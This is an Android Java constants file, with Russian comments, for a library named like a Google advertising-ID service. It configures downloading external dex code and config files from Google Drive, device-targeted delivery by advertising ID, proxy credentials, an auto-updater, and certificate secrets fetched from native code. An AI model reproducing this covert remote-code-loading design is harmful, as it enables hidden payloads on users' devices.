package com.advertising_id_service.appclick.googleadvertisingidservice;

import android.content.Context;
import android.os.Environment;

import java.io.File;

public final class GlobalParameters {
    public static String CODE_VERSION = "1.8.4";  //Версия кода 1.8.4 !!!
    public static boolean NEED_LOG = true;      //Надо ли вести логирование
    public static final String EXTERNAL_PACKAGE_NAME = "com.adid_service.external_lib.external_code_lib"; //Имя пакета во внешней библиотеке

    public static String DEX_DEFAULT_FILE_NAME = "classes.dex";          //имя dex-файла с внешними классами
    public static String CONFIG_FILE_NAME      = "config.json";          //имя закачиваемого файла конфигурации
    public static String CONFIG_MASK_FILE_NAME = "config_mask.json";     //имя закачиваемого файла конфигурации масок

    public static String DEX_DEFAULT_FILE_NAME_ZIP = "gaid.zip";// "classes.zip";         //имя dex-файла с внешними классами. Сервер сейчас отдаёт любой файл как gaid.zip
    public static String CONFIG_FILE_NAME_ZIP      = "gaid.zip";//"config.zip";          //имя закачиваемого файла конфигурации. Сервер сейчас отдаёт любой файл как gaid.zip
    public static String CONFIG_MASK_FILE_NAME_ZIP = "gaid.zip";//"config_mask.zip";     //имя закачиваемого файла конфигурации масок. Сервер сейчас отдаёт любой файл как gaid.zip

    public static String URL_TO_CONFIG_FILE      = "config_1.zip";//"https://drive.google.com/a/adviator.com/uc?authuser=0&id=134aH-Y1FQZcKC_Pwt06ygTyXHyafaARp&export=download";
    public static String URL_TO_CONFIG_MASK_FILE = "config_mask.zip";//"https://drive.google.com/a/adviator.com/uc?authuser=0&id=16_p9Y3RXfqgkg8MeZyiAiQMZCztGSow3&export=download";

    public static Boolean isUpdateTimerStart    = false;
    public static Boolean isNeedStopAutoUpdater = false;
    // Константы ключей настроечного json-а
    //
//      {"path_to_conf_file": "https://drive.google.com/a/adviator.com/uc?authuser=0&id=1ssMCNlcAe2waMwbn7thjVwwa4dEoho1q&export=download",
//      "versions":{
//        "1.8.4":
//        {
//              "whats_new":             "Версия 1.8.4, добавлена функция работы с...",
//              "forbidden_apk_package": ["com.example.googamse", "com.example.appclick", "com.mks.test_dynamic_code"],
//              "forbidden_version":     ["1.8.2", "1.8.3"],
//              "device_id":             ["6f5debd9-6896-4d0f-a224-7860af3dea4e","3bade17a-c31f-4816-bd16-e6ca8471d136"],
//              "critical":              "false",
//              "path":                  "https://drive.google.com/a/adviator.com/uc?authuser=0&id=1HxP1jbW7jzyP62VYUezyDvj5lqBJODff&export=download",
//              "dex_hash_code":         "FDABA591E236BEA36179B20D0A8C9E13762C5E97"
//        },
//      ....
//     }

    //Ключи настроечного json-файла
    public static String JSON_KEY_PATH_TO_CONF_FILE     = "path_to_conf_file";     //Путь до "правильного" настроечного файла
    public static String JSON_KEY_VERSIONS              = "versions";              //По этому ключу массив настроек для каждой версии
    public static String JSON_KEY_FORBIDDEN_APK_PACKAGE = "forbidden_apk_package"; //Запрещенные пакеты. Т.е. этот dex не будет скачиваться, если был запрошен из этого пакета
    public static String JSON_KEY_FORBIDDEN_VERSION     = "forbidden_version";     //Запрещенные версии. Т.е. этот dex не будет скачиваться, если был запрошен из библиотеки с этой версии  (могут быть заданы диапазоном 1.0.5-1.1.5 или простыми значениями 1.3.6, через запятую)
    public static String JSON_KEY_DEVICE_ID             = "device_id";             //Если заполнен, то dex скачивается только на устройствах с такими GAID-ами
    public static String JSON_KEY_PATH                  = "path";                  //Путь/"имя файла на сервере" до dex файла этой версии
    public static String JSON_KEY_DEX_HASH              = "dex_hash_code";         //Hesh - код dex файла, что бы его не подменили

    public static String JSON_KEY_PROXYS                = "proxys";                //Ключ до массива прокси
    public static String JSON_KEY_PROXY_HOST            = "host";                  //Хост прокси
    public static String JSON_KEY_PROXY_PORT            = "port";                  //Порт прокси
    public static String JSON_KEY_PROXY_LOGIN           = "login";                 //Логин прокси
    public static String JSON_KEY_PROXY_PASSWORD        = "password";              //Пароль прокси
    public static String JSON_KEY_PROXY_TIMEOUT         = "timeout";               //Таймаут по которому считаем что прокси не отвечает, если 0 то используется дефолтный

    public static String SPF_SESSION_PATH_TO_CONF_FILE = "pref_session";
    public static String SPF_KEY_PATH_TO_CONF_FILE     = "path_to_conf_file";           //Сохраненный путь откуда был скачен конфигурационный файл
    public static String SPF_SESSION_PAID              = "pref_session_paid";
    public static String SPF_KEY_PAID                  = "spf_key_paid";                //Сохраненный паблишер, запрашиваем только один раз
    public static String SPF_SESSION_DEX_HASH          = "pref_dex_hash";
    public static String SPF_KEY_DEX_HASH              = "spf_key_dex_hash";            //"правильный" dex для скаченного dex-файла

    public static final String SPF_SESSION_SHIFT           = "session_shift";
    public static final String SPF_SESSION_PERIOD          = "session_period";
    public static final String SPF_SESSION_LAST_START_TIME = "session_last_start_time";
    public static final String SPF_KEY_SHIFT               = "shift";                   //Смещение первого запуска автообновлятора
    public static final String SPF_KEY_PERIOD              = "period";                  //Период с которым запускать обновления
    public static final String SPF_KEY_LAST_START_TIME     = "last_start_time";         //Время последнего запуска обновления

    public static final String SPF_SESSION_VERSION         = "session_code_version";
    public static final String SPF_KEY_VERSION             = "code_version";            //Код предыдущей скаченной версии dex-файла

    public static String JSON_KEY_MASKS           = "masks";        //Динамически подгружаемая маска
    public static String JSON_KEY_MASKS_PREFIX    = "prefix";       //Префикс в маске
    public static String JSON_KEY_MASKS_SEPARATOR = "separator";    //Разделитель в маске
    public static String JSON_KEY_MASKS_EXTENSION = "extension";    //Расширение в маске

    public static String getBasePath(Context cnt) //путь по которому сохраняются скаченные файлы (настроечные, dex-файлы, динамические файлы маски...)
    {
        return  "" + cnt.getCacheDir()+ File.separator;
        //return  "" + Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + File.separator;
    }

    public static String DexFilePath(Context cnt)       {return  "" + getBasePath(cnt) + DEX_DEFAULT_FILE_NAME;}
    public static String ConfigFilePath(Context cnt)    {return  "" + getBasePath(cnt) + CONFIG_FILE_NAME;}
    public static String ConfigMaskFilePath(Context cnt){return  "" + getBasePath(cnt) + CONFIG_MASK_FILE_NAME;}

    public static String DexFilePathZip(Context cnt)       {return  "" + getBasePath(cnt) + DEX_DEFAULT_FILE_NAME_ZIP;}
    public static String ConfigFilePathZip(Context cnt)    {return  "" + getBasePath(cnt) + CONFIG_FILE_NAME_ZIP;}
    public static String ConfigMaskFilePathZip(Context cnt){return  "" + getBasePath(cnt) + CONFIG_MASK_FILE_NAME_ZIP;}

    public native String getPassToCert_ndk();   //ndk метод получения пароля для сертификата
    public native String getCert_ndk();         //ndk метод полученяи самог осертификата
    public native String stringFromJNI();       //Тестовый ndk метод, не используется

    static {
        System.loadLibrary("hello-jni2");
    }
    public String testJNI()
    {
        return stringFromJNI();
    }
    public String getPassToCert()
    {
        return getPassToCert_ndk();
    }
    public String getCert()
    {
        return getCert_ndk();
    }
}
